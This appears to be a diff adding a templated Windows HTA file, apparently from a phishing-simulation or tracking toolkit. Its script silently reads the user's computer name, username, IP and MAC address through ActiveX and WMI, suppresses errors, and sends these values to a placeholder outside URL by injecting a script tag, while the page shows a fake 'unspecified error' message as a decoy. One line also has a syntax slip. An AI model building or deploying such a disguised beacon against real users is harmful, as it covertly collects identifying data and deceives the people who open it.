@@ -1,0 +1,108 @@
+<html>
+<head>
+<title>#APPLICATION_TITLE#</title>
+<HTA:APPLICATION
+APPLICATIONNAME="#APPLICATION_TITLE#"
+ID="#APPLICATION_TITLE#"
+VERSION="1.0"
+BORDER="dialog"
+INNERBORDER="no"
+MAXIMIZEBUTTON="no"
+MINIMIZEBUTTON="no"
+ICON="Help.ico"
+SCROLL="no"/>
+</head>
+
+<script language="VBScript">
+
+Sub Window_OnLoad
+End Sub
+Sub OnClickButtonCancel()
+window.Close
+End Sub
+
+
+</script>
+
+<body bgcolor=#fffff;>
+	<table border=0 width=100% height=100%>
+		<tr>
+			<td height=100% width=100% valign=top align=left>
+
+			<script type="text/javascript">
+
+			function computername()
+			{
+				var wshShell = new ActiveXObject("WScript.Shell");
+				var computername = wshShell.ExpandEnvironmentStrings("%COMPUTERNAME%");
+				return computername
+			}
+
+			function username()
+			{
+				var wshshell=new ActiveXObject("wscript.shell");
+				var username=wshshell.ExpandEnvironmentStrings("%username%");
+				return username
+			}
+
+			function ipAddress()
+			{
+				var ipAddress = "";
+				var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}");
+				e = new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True"));
+					for(; !e.atEnd(); e.moveNext()) {
+						var s = e.item();
+						ipAddress = s.IPAddress(0);
+					}
+				return ipAddress
+			}
+
+			function macAddress()
+			{
+				var macAddress = "";
+				var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}");
+				e = new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True"));
+					for(; !e.atEnd(); e.moveNext()) {
+						var s = e.item();
+						macAddress = s.MACAddress;
+					}
+				return macAddress
+			}
+
+			window.onerror = function(message, url, linenumber)
+			{
+  			return true;
+			}
+
+			/* Global variables */
+			var cname = computername();
+			var uname = username();
+			var ip = ipAddress();
+			var mac = macAddress();
+
+			var base_url = "{{BASE_URL}}";
+
+			var link = base_url + "&username=" + uname +"&computername=" + cname + "&ip=" + ip + "&mac=" + mac "&payload=HTA";
+
+			var script = document.createElement('script');
+    	script.type = 'text/javascript';
+    	script.async = true;
+    	script.src = link;
+
+    	document.getElementsByTagName('head')[0].appendChild(script);
+
+			</script>
+			<p style="margin-top: 0; margin-bottom: 0">&nbsp;</p>
+			<center>
+			<span><strong>Error:</strong> There was an unspecified error opening this html application.</span>
+			</center>
+			</td>
+		</tr>
+		<tr>
+			<td align=right>
+				<input type="button" style="width: 80px" name="Close" id="Cancel" value="Close" onclick="OnClickButtonCancel">
+			</td>
+		</tr>
+	</table>
+</body>
+</html>
